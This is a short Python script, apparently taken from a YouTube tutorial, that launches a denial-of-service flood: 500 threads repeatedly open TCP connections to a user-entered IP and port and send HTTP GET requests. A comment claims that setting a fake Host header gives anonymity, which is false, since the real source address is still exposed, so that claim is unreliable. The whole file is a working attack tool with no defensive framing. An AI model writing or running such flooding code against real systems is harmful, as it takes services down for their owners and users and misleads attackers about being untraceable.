#https://youtu.be/FGdiSJakIS4?si=pnFRZsogROPXIZqN

import socket
import threading

target_ip = input("Enter Target IP: ")
target_port = int(input("Enter Target Port: "))
# Fake IP address to spoof not get aunonymity
fake_ip = "182.168.1.1"

already_connected = 0

def attack():
    global already_connected
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

        already_connected += 1
        if already_connected % 100 == 0:
            print(f"Packets Sent: {already_connected}")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
